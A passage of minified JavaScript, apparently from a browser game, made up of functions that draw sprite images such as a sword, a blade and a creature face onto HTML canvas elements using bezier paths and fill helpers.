                return n.width = 424 * e,
                    n.height = 788 * e,
                    r.translate(25 * e, 25 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(193.5 * e, 602.5 * e),
                    r.rotate(-.12),
                    Ve(r, -26.5 * e, -97.5 * e, 53 * e, 195 * e, 25 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(137 * e, 519 * e),
                    r.bezierCurveTo(182 * e, 513 * e, 182 * e, 513 * e, 227 * e, 507 * e),
                    r.bezierCurveTo(214 * e, 417 * e, 189 * e, 304 * e, 221 * e, 180 * e),
                    r.bezierCurveTo(191 * e, 126 * e, 192 * e, 105 * e, 198 * e, 64 * e),
                    r.bezierCurveTo(123 * e, 102 * e, 99 * e, 285 * e, 137 * e, 517 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(175 * e, 119 * e),
                    r.bezierCurveTo(176 * e, 142 * e, 184 * e, 165 * e, 197 * e, 183 * e),
                    r.bezierCurveTo(167 * e, 325 * e, 191 * e, 405 * e, 202 * e, 502 * e),
                    r.bezierCurveTo(180 * e, 503 * e, 180 * e, 503 * e, 158 * e, 504 * e),
                    r.bezierCurveTo(135 * e, 396 * e, 134 * e, 185 * e, 175 * e, 119 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(110 * e, 518 * e),
                    r.bezierCurveTo(111.5 * e, 533 * e, 111.5 * e, 533 * e, 113 * e, 548 * e),
                    r.bezierCurveTo(162.5 * e, 544 * e, 162.5 * e, 544 * e, 212 * e, 540 * e),
                    r.bezierCurveTo(312 * e, 535 * e, 281 * e, 665 * e, 225 * e, 665 * e),
                    r.bezierCurveTo(227 * e, 686.5 * e, 227 * e, 686.5 * e, 229 * e, 708 * e),
                    r.bezierCurveTo(343 * e, 684 * e, 354 * e, 496 * e, 222 * e, 498 * e),
                    r.bezierCurveTo(165.5 * e, 503 * e, 165.5 * e, 503 * e, 109 * e, 508 * e),
                    r.closePath(),
                    he(r, i[0]),
                    ke(r, 204 * e, 693 * e, 36.013886210738214 * e),
                    he(r, i[0]),
                    ke(r, 105 * e, 518 * e, 30 * e),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(171 * e, 535 * e),
                    r.bezierCurveTo(139.5 * e, 537.5 * e, 139.5 * e, 537.5 * e, 108 * e, 540 * e),
                    r.bezierCurveTo(110 * e, 527.5 * e, 110 * e, 527.5 * e, 112 * e, 515 * e),
                    r.bezierCurveTo(148 * e, 513 * e, 148 * e, 513 * e, 184 * e, 511 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(244 * e, 669 * e),
                    r.bezierCurveTo(248.5 * e, 680 * e, 248.5 * e, 680 * e, 253 * e, 691 * e),
                    r.bezierCurveTo(239.5 * e, 697 * e, 239.5 * e, 697 * e, 226 * e, 703 * e),
                    r.bezierCurveTo(223 * e, 691.5 * e, 223 * e, 691.5 * e, 220 * e, 680 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-25 * e, -25 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(193.5 * e, 602.5 * e),
                    r.rotate(-.12),
                    Ve(r, -26.5 * e, -97.5 * e, 53 * e, 195 * e, 25 * e),
                    r.restore(),
                    he(r, i[1], i[2], 16 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(137 * e, 519 * e),
                    r.bezierCurveTo(182 * e, 513 * e, 182 * e, 513 * e, 227 * e, 507 * e),
                    r.bezierCurveTo(214 * e, 417 * e, 189 * e, 304 * e, 221 * e, 180 * e),
                    r.bezierCurveTo(191 * e, 126 * e, 192 * e, 105 * e, 198 * e, 64 * e),
                    r.bezierCurveTo(123 * e, 102 * e, 99 * e, 285 * e, 137 * e, 517 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 16 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(175 * e, 119 * e),
                    r.bezierCurveTo(176 * e, 142 * e, 184 * e, 165 * e, 197 * e, 183 * e),
                    r.bezierCurveTo(167 * e, 325 * e, 191 * e, 405 * e, 202 * e, 502 * e),
                    r.bezierCurveTo(180 * e, 503 * e, 180 * e, 503 * e, 158 * e, 504 * e),
                    r.bezierCurveTo(135 * e, 396 * e, 134 * e, 185 * e, 175 * e, 119 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(110 * e, 518 * e),
                    r.bezierCurveTo(111.5 * e, 533 * e, 111.5 * e, 533 * e, 113 * e, 548 * e),
                    r.bezierCurveTo(162.5 * e, 544 * e, 162.5 * e, 544 * e, 212 * e, 540 * e),
                    r.bezierCurveTo(312 * e, 535 * e, 281 * e, 665 * e, 225 * e, 665 * e),
                    r.bezierCurveTo(227 * e, 686.5 * e, 227 * e, 686.5 * e, 229 * e, 708 * e),
                    r.bezierCurveTo(343 * e, 684 * e, 354 * e, 496 * e, 222 * e, 498 * e),
                    r.bezierCurveTo(165.5 * e, 503 * e, 165.5 * e, 503 * e, 109 * e, 508 * e),
                    r.closePath(),
                    he(r, i[6], i[4], 16 * e),
                    ke(r, 204 * e, 693 * e, 36.013886210738214 * e),
                    he(r, i[6], i[4], 16 * e),
                    ke(r, 105 * e, 518 * e, 30 * e),
                    he(r, i[6], i[4], 16 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(171 * e, 535 * e),
                    r.bezierCurveTo(139.5 * e, 537.5 * e, 139.5 * e, 537.5 * e, 108 * e, 540 * e),
                    r.bezierCurveTo(110 * e, 527.5 * e, 110 * e, 527.5 * e, 112 * e, 515 * e),
                    r.bezierCurveTo(148 * e, 513 * e, 148 * e, 513 * e, 184 * e, 511 * e),
                    r.closePath(),
                    he(r, i[6]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(244 * e, 669 * e),
                    r.bezierCurveTo(248.5 * e, 680 * e, 248.5 * e, 680 * e, 253 * e, 691 * e),
                    r.bezierCurveTo(239.5 * e, 697 * e, 239.5 * e, 697 * e, 226 * e, 703 * e),
                    r.bezierCurveTo(223 * e, 691.5 * e, 223 * e, 691.5 * e, 220 * e, 680 * e),
                    r.closePath(),
                    he(r, i[6]),
                    ke(r, 204 * e, 693 * e, 17.029386365926403 * e),
                    he(r, i[7]),
                    ke(r, 106 * e, 518 * e, 12 * e),
                    he(r, i[7]),
                    n
            }
            function Z1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 100 * e,
                    n.height = 250 * e,
                    r.translate(-135 * e, -75 * e),
                    r.globalAlpha = t ? .8 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(178.5 * e, 238.03125 * e),
                    r.bezierCurveTo(177 * e, 175.03125 * e, 177 * e, 175.03125 * e, 175.5 * e, 112.03125 * e),
                    r.bezierCurveTo(184.5 * e, 100.53125 * e, 184.5 * e, 100.53125 * e, 193.5 * e, 89.03125 * e),
                    r.bezierCurveTo(202 * e, 100.03125 * e, 202 * e, 100.03125 * e, 210.5 * e, 111.03125 * e),
                    r.bezierCurveTo(209.5 * e, 174.03125 * e, 209.5 * e, 174.03125 * e, 208.5 * e, 237.03125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(155.5 * e, 239.03125 * e),
                    r.bezierCurveTo(194 * e, 238.53125 * e, 194 * e, 238.53125 * e, 232.5 * e, 238.03125 * e),
                    r.bezierCurveTo(232.5 * e, 243.03125 * e, 232.5 * e, 243.03125 * e, 232.5 * e, 248.03125 * e),
                    r.bezierCurveTo(194 * e, 248.53125 * e, 194 * e, 248.53125 * e, 155.5 * e, 249.03125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    ke(r, 160.5 * e, 243.03125 * e, 7 * e),
                    he(r, i[0]),
                    ke(r, 227.5 * e, 242.03125 * e, 7 * e),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(185.5 * e, 253.03125 * e),
                    r.bezierCurveTo(193.5 * e, 253.03125 * e, 193.5 * e, 253.03125 * e, 201.5 * e, 253.03125 * e),
                    r.bezierCurveTo(201.5 * e, 276.03125 * e, 201.5 * e, 276.03125 * e, 201.5 * e, 299.03125 * e),
                    r.bezierCurveTo(194.5 * e, 299.03125 * e, 194.5 * e, 299.03125 * e, 187.5 * e, 299.03125 * e),
                    r.closePath(),
                    he(r, i[0], i[0], 5 * e),
                    ke(r, 194 * e, 298 * e, 9 * e),
                    he(r, i[0], i[0], 5 * e),
                    r.globalAlpha = 1,
                    r.translate(-10 * e, 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(178.5 * e, 238.03125 * e),
                    r.bezierCurveTo(177 * e, 175.03125 * e, 177 * e, 175.03125 * e, 175.5 * e, 112.03125 * e),
                    r.bezierCurveTo(184.5 * e, 100.53125 * e, 184.5 * e, 100.53125 * e, 193.5 * e, 89.03125 * e),
                    r.bezierCurveTo(202 * e, 100.03125 * e, 202 * e, 100.03125 * e, 210.5 * e, 111.03125 * e),
                    r.bezierCurveTo(209.5 * e, 174.03125 * e, 209.5 * e, 174.03125 * e, 208.5 * e, 237.03125 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(155.5 * e, 239.03125 * e),
                    r.bezierCurveTo(194 * e, 238.53125 * e, 194 * e, 238.53125 * e, 232.5 * e, 238.03125 * e),
                    r.bezierCurveTo(232.5 * e, 243.03125 * e, 232.5 * e, 243.03125 * e, 232.5 * e, 248.03125 * e),
                    r.bezierCurveTo(194 * e, 248.53125 * e, 194 * e, 248.53125 * e, 155.5 * e, 249.03125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 5 * e),
                    ke(r, 160.5 * e, 243.03125 * e, 7 * e),
                    he(r, i[1], i[2], 5 * e),
                    ke(r, 227.5 * e, 242.03125 * e, 7 * e),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(185.5 * e, 253.03125 * e),
                    r.bezierCurveTo(193.5 * e, 253.03125 * e, 193.5 * e, 253.03125 * e, 201.5 * e, 253.03125 * e),
                    r.bezierCurveTo(201.5 * e, 276.03125 * e, 201.5 * e, 276.03125 * e, 201.5 * e, 299.03125 * e),
                    r.bezierCurveTo(194.5 * e, 299.03125 * e, 194.5 * e, 299.03125 * e, 187.5 * e, 299.03125 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 7 * e),
                    ke(r, 194 * e, 298 * e, 9 * e),
                    he(r, i[1], i[2], 7 * e),
                    n
            }
            function Q1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 290 * e,
                    n.height = 525 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(20 * e, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111 * e, 351 * e),
                    r.bezierCurveTo(129 * e, 218 * e, 129 * e, 218 * e, 147 * e, 85 * e),
                    r.bezierCurveTo(167 * e, 65.5 * e, 167 * e, 65.5 * e, 187 * e, 46 * e),
                    r.bezierCurveTo(201.5 * e, 70.5 * e, 201.5 * e, 70.5 * e, 216 * e, 95 * e),
                    r.bezierCurveTo(194.5 * e, 227.5 * e, 194.5 * e, 227.5 * e, 173 * e, 360 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(131 * e, 425.5 * e),
                    r.rotate(.16),
                    Ve(r, -14 * e, -56.5 * e, 28 * e, 113 * e, 8 * e),
                    r.restore(),
                    he(r, i[0]),
                    ke(r, 122 * e, 480 * e, 18.439088914585774 * e),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79 * e, 371 * e),
                    r.bezierCurveTo(131 * e, 373 * e, 145 * e, 378 * e, 197 * e, 388 * e),
                    r.bezierCurveTo(205 * e, 382.5 * e, 205 * e, 382.5 * e, 213 * e, 377 * e),
                    r.bezierCurveTo(167 * e, 352 * e, 117 * e, 345 * e, 69 * e, 355 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(-20 * e, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(111 * e, 351 * e),
                    r.bezierCurveTo(129 * e, 218 * e, 129 * e, 218 * e, 147 * e, 85 * e),
                    r.bezierCurveTo(167 * e, 65.5 * e, 167 * e, 65.5 * e, 187 * e, 46 * e),
                    r.bezierCurveTo(201.5 * e, 70.5 * e, 201.5 * e, 70.5 * e, 216 * e, 95 * e),
                    r.bezierCurveTo(194.5 * e, 227.5 * e, 194.5 * e, 227.5 * e, 173 * e, 360 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 12.5 * e),
                    r.save(),
                    r.translate(131 * e, 425.5 * e),
                    r.rotate(.16),
                    Ve(r, -14 * e, -56.5 * e, 28 * e, 113 * e, 8 * e),
                    r.restore(),
                    he(r, i[4], i[5], 12.5 * e),
                    ke(r, 122 * e, 480 * e, 18.439088914585774 * e),
                    he(r, i[4], i[5], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(79 * e, 371 * e),
                    r.bezierCurveTo(131 * e, 373 * e, 145 * e, 378 * e, 197 * e, 388 * e),
                    r.bezierCurveTo(205 * e, 382.5 * e, 205 * e, 382.5 * e, 213 * e, 377 * e),
                    r.bezierCurveTo(167 * e, 352 * e, 117 * e, 345 * e, 69 * e, 355 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 12.5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(128 * e, 345 * e),
                    r.bezierCurveTo(142 * e, 345 * e, 147 * e, 346 * e, 158 * e, 349 * e),
                    r.bezierCurveTo(177.5 * e, 224.5 * e, 177.5 * e, 224.5 * e, 197 * e, 100 * e),
                    r.bezierCurveTo(190.5 * e, 84.5 * e, 190.5 * e, 84.5 * e, 184 * e, 69 * e),
                    r.bezierCurveTo(173.5 * e, 82 * e, 173.5 * e, 82 * e, 163 * e, 95 * e),
                    r.closePath(),
                    he(r, i[3]),
                    n
            }
            function $1(e, t, i, n) {
                var r = document.createElement("canvas")
                    , o = r.getContext("2d");
                return r.width = 283 * e,
                    r.height = 224 * e,
                    o.translate(0, 15 * e),
                    o.globalAlpha = .5,
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(93 * e, 55 * e),
                    o.bezierCurveTo(127 * e, 27 * e, 195 * e, 42 * e, 213 * e, 78 * e),
                    o.bezierCurveTo(254 * e, 134 * e, 226 * e, 198 * e, 153 * e, 197 * e),
                    o.bezierCurveTo(59 * e, 204 * e, 56 * e, 158 * e, 51 * e, 115 * e),
                    o.bezierCurveTo(50 * e, 93 * e, 81 * e, 62 * e, 90 * e, 57 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(100 * e, 33 * e),
                    o.bezierCurveTo(85 * e, 62 * e, 102 * e, 66 * e, 110 * e, 83 * e),
                    o.closePath(),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(181 * e, 32 * e),
                    o.bezierCurveTo(196 * e, 62 * e, 181 * e, 68 * e, 178 * e, 69 * e),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(225 * e, 52 * e),
                    o.bezierCurveTo(228 * e, 78 * e, 207 * e, 77 * e, 192 * e, 88 * e),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(34 * e, 134 * e),
                    o.bezierCurveTo(46 * e, 111 * e, 57 * e, 111 * e, 79 * e, 109 * e),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(249 * e, 135 * e),
                    o.bezierCurveTo(233 * e, 107 * e, 212 * e, 112 * e, 202 * e, 115 * e),
                    he(o, i[0]),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(56 * e, 50 * e),
                    o.bezierCurveTo(56 * e, 82 * e, 73 * e, 82 * e, 93 * e, 89 * e),
                    he(o, i[0]),
                    o.translate(0, -15 * e),
                    o.globalAlpha = 1,
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(100 * e, 33 * e),
                    o.bezierCurveTo(85 * e, 62 * e, 102 * e, 66 * e, 110 * e, 83 * e),
                    he(o, void 0, i[2], 40 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(181 * e, 32 * e),
                    o.bezierCurveTo(196 * e, 62 * e, 181 * e, 68 * e, 178 * e, 69 * e),
                    he(o, void 0, i[2], 40 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(225 * e, 52 * e),
                    o.bezierCurveTo(228 * e, 78 * e, 207 * e, 77 * e, 192 * e, 88 * e),
                    he(o, void 0, i[2], 40 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(34 * e, 134 * e),
                    o.bezierCurveTo(46 * e, 111 * e, 57 * e, 111 * e, 79 * e, 109 * e),
                    he(o, void 0, i[2], 40 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(249 * e, 135 * e),
                    o.bezierCurveTo(233 * e, 107 * e, 212 * e, 112 * e, 202 * e, 115 * e),
                    he(o, void 0, i[2], 40 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(56 * e, 50 * e),
                    o.bezierCurveTo(56 * e, 82 * e, 73 * e, 82 * e, 93 * e, 89 * e),
                    he(o, void 0, i[2], 40 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(93 * e, 55 * e),
                    o.bezierCurveTo(127 * e, 27 * e, 195 * e, 42 * e, 213 * e, 78 * e),
                    o.bezierCurveTo(254 * e, 134 * e, 226 * e, 198 * e, 153 * e, 197 * e),
                    o.bezierCurveTo(59 * e, 204 * e, 56 * e, 158 * e, 51 * e, 115 * e),
                    o.bezierCurveTo(50 * e, 93 * e, 81 * e, 62 * e, 90 * e, 57 * e),
                    o.closePath(),
                    he(o, i[1], i[2], 10 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(100 * e, 33 * e),
                    o.bezierCurveTo(85 * e, 62 * e, 102 * e, 66 * e, 110 * e, 83 * e),
                    he(o, void 0, i[1], 20 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(181 * e, 32 * e),
                    o.bezierCurveTo(196 * e, 62 * e, 181 * e, 68 * e, 178 * e, 69 * e),
                    he(o, void 0, i[1], 20 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(225 * e, 52 * e),
                    o.bezierCurveTo(228 * e, 78 * e, 207 * e, 77 * e, 192 * e, 88 * e),
                    he(o, void 0, i[1], 20 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(34 * e, 134 * e),
                    o.bezierCurveTo(46 * e, 111 * e, 57 * e, 111 * e, 79 * e, 109 * e),
                    he(o, void 0, i[1], 20 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(249 * e, 135 * e),
                    o.bezierCurveTo(233 * e, 107 * e, 212 * e, 112 * e, 202 * e, 115 * e),
                    he(o, void 0, i[1], 20 * e),
                    o.beginPath(),
                    o.lineCap = "round",
                    o.lineJoin = "round",
                    o.moveTo(56 * e, 50 * e),
                    o.bezierCurveTo(56 * e, 82 * e, 73 * e, 82 * e, 93 * e, 89 * e),
                    he(o, void 0, i[1], 20 * e),
                    ke(o, 101 * e, 155 * e, 20.591260281974 * e),
                    he(o, i[3]),
                    ke(o, 180 * e, 155 * e, 20.591260281974 * e),
                    he(o, i[3]),
                    ke(o, 95 * e, 148 * e, 7.211102550927978 * e),
                    he(o, i[4]),
                    ke(o, 173 * e, 148 * e, 7.211102550927978 * e),
                    he(o, i[4]),
                    1 === n && (o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(191 * e, 107 * e),
                        o.bezierCurveTo(180 * e, 104 * e, 175 * e, 101 * e, 180 * e, 95 * e),
                        o.bezierCurveTo(180 * e, 95 * e, 181 * e, 99 * e, 188 * e, 103 * e),
                        o.bezierCurveTo(191 * e, 101 * e, 191 * e, 95 * e, 190 * e, 91 * e),
                        o.bezierCurveTo(190 * e, 91 * e, 196 * e, 89 * e, 195 * e, 99 * e),
                        o.closePath(),
                        he(o, i[2]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(206 * e, 98 * e),
                        o.bezierCurveTo(203 * e, 95 * e, 200 * e, 93 * e, 198 * e, 101 * e),
                        o.bezierCurveTo(194 * e, 109 * e, 193 * e, 109 * e, 196 * e, 110 * e),
                        o.bezierCurveTo(206 * e, 115 * e, 209 * e, 114 * e, 211 * e, 111 * e),
                        o.bezierCurveTo(211 * e, 106 * e, 208 * e, 108 * e, 203 * e, 108 * e),
                        o.bezierCurveTo(193 * e, 107 * e, 204 * e, 101 * e, 206 * e, 99 * e),
                        o.closePath(),
                        he(o, i[2]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(172 * e, 111 * e),
                        o.bezierCurveTo(172 * e, 106 * e, 174 * e, 105 * e, 185 * e, 109 * e),
                        o.bezierCurveTo(190 * e, 109 * e, 189 * e, 114 * e, 185 * e, 120 * e),
                        o.bezierCurveTo(181 * e, 125 * e, 180 * e, 126 * e, 176 * e, 122 * e),
                        o.bezierCurveTo(182 * e, 119 * e, 187 * e, 110 * e, 182 * e, 112 * e),
                        o.closePath(),
                        he(o, i[2]),
                        o.beginPath(),
                        o.lineCap = "round",
                        o.lineJoin = "round",
                        o.moveTo(202 * e, 125 * e),
                        o.bezierCurveTo(197 * e, 117 * e, 193 * e, 116 * e, 193 * e, 120 * e),
                        o.bezierCurveTo(192.5 * e, 124.5 * e, 192.5 * e, 124.5 * e, 192 * e, 129 * e),
                        o.bezierCurveTo(188 * e, 129 * e, 187 * e, 124 * e, 189 * e, 120 * e),
                        o.bezierCurveTo(191 * e, 110 * e, 192 * e, 110 * e, 200 * e, 116 * e),
                        o.bezierCurveTo(208 * e, 120 * e, 207 * e, 123 * e, 202 * e, 125 * e),
                        o.closePath(),
                        he(o, i[2])),
                    r
            }
            function et(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 283 * e,
                    i.height = 224 * e,
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(100 * e, 33 * e),
                    n.bezierCurveTo(85 * e, 62 * e, 102 * e, 66 * e, 110 * e, 83 * e),
                    he(n, void 0, t[0], 40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(181 * e, 32 * e),
                    n.bezierCurveTo(196 * e, 62 * e, 181 * e, 68 * e, 178 * e, 69 * e),
                    he(n, void 0, t[0], 40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(225 * e, 52 * e),
                    n.bezierCurveTo(228 * e, 78 * e, 207 * e, 77 * e, 192 * e, 88 * e),
                    he(n, void 0, t[0], 40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(34 * e, 134 * e),
                    n.bezierCurveTo(46 * e, 111 * e, 57 * e, 111 * e, 79 * e, 109 * e),
                    he(n, void 0, t[0], 40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(249 * e, 135 * e),
                    n.bezierCurveTo(233 * e, 107 * e, 212 * e, 112 * e, 202 * e, 115 * e),
                    he(n, void 0, t[0], 40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(56 * e, 50 * e),
                    n.bezierCurveTo(56 * e, 82 * e, 73 * e, 82 * e, 93 * e, 89 * e),
                    he(n, void 0, t[0], 40 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(93 * e, 55 * e),
                    n.bezierCurveTo(124 * e, 29 * e, 179 * e, 44 * e, 188 * e, 52 * e),
                    n.bezierCurveTo(207 * e, 64 * e, 226 * e, 94 * e, 231 * e, 118 * e),
                    n.bezierCurveTo(236 * e, 145 * e, 222 * e, 184 * e, 193 * e, 192 * e),
                    n.bezierCurveTo(147 * e, 201 * e, 116 * e, 200 * e, 93 * e, 193 * e),
                    n.bezierCurveTo(61 * e, 180 * e, 48 * e, 147 * e, 50 * e, 123 * e),
                    n.bezierCurveTo(50 * e, 93 * e, 76 * e, 66 * e, 92 * e, 56 * e),
                    n.closePath(),
                    he(n, t[0]),
                    i
            }
            function tt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 131 * e,
                    n.height = 121 * e,
                    r.translate(0, 20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(110 * e, 59 * e),
                    r.bezierCurveTo(93 * e, 61.5 * e, 93 * e, 61.5 * e, 76 * e, 64 * e),
                    r.bezierCurveTo(84.5 * e, 78.5 * e, 84.5 * e, 78.5 * e, 93 * e, 93 * e),
                    r.bezierCurveTo(70 * e, 111 * e, 43 * e, 103 * e, 30 * e, 82 * e),
                    r.bezierCurveTo(17 * e, 61 * e, 25 * e, 30 * e, 51 * e, 21 * e),
                    r.bezierCurveTo(66 * e, 15 * e, 83 * e, 18 * e, 96 * e, 29 * e),
                    r.bezierCurveTo(104 * e, 35 * e, 109 * e, 47 * e, 110 * e, 58 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -20 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(110 * e, 59 * e),
                    r.bezierCurveTo(93 * e, 61.5 * e, 93 * e, 61.5 * e, 76 * e, 64 * e),
                    r.bezierCurveTo(84.5 * e, 78.5 * e, 84.5 * e, 78.5 * e, 93 * e, 93 * e),
                    r.bezierCurveTo(70 * e, 111 * e, 43 * e, 103 * e, 30 * e, 82 * e),
                    r.bezierCurveTo(17 * e, 61 * e, 25 * e, 30 * e, 51 * e, 21 * e),
                    r.bezierCurveTo(66 * e, 15 * e, 83 * e, 18 * e, 96 * e, 29 * e),
                    r.bezierCurveTo(104 * e, 35 * e, 109 * e, 47 * e, 110 * e, 58 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    n
            }
            function it(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 104 * e,
                    n.height = 112 * e,
                    r.translate(0, 15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(16 * e, 44 * e),
                    r.bezierCurveTo(30.5 * e, 48 * e, 30.5 * e, 48 * e, 45 * e, 52 * e),
                    r.bezierCurveTo(36.5 * e, 63 * e, 36.5 * e, 63 * e, 28 * e, 74 * e),
                    r.bezierCurveTo(32 * e, 86 * e, 61 * e, 92 * e, 78 * e, 76 * e),
                    r.bezierCurveTo(93 * e, 62 * e, 92 * e, 40 * e, 80 * e, 26 * e),
                    r.bezierCurveTo(65 * e, 11 * e, 42 * e, 16 * e, 34 * e, 21 * e),
                    r.bezierCurveTo(22 * e, 27 * e, 16 * e, 39 * e, 16 * e, 44 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(16 * e, 44 * e),
                    r.bezierCurveTo(30.5 * e, 48 * e, 30.5 * e, 48 * e, 45 * e, 52 * e),
                    r.bezierCurveTo(36.5 * e, 63 * e, 36.5 * e, 63 * e, 28 * e, 74 * e),
                    r.bezierCurveTo(32 * e, 86 * e, 61 * e, 92 * e, 78 * e, 76 * e),
                    r.bezierCurveTo(93 * e, 62 * e, 92 * e, 40 * e, 80 * e, 26 * e),
                    r.bezierCurveTo(65 * e, 11 * e, 42 * e, 16 * e, 34 * e, 21 * e),
                    r.bezierCurveTo(22 * e, 27 * e, 16 * e, 39 * e, 16 * e, 44 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    n
            }
            function nt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
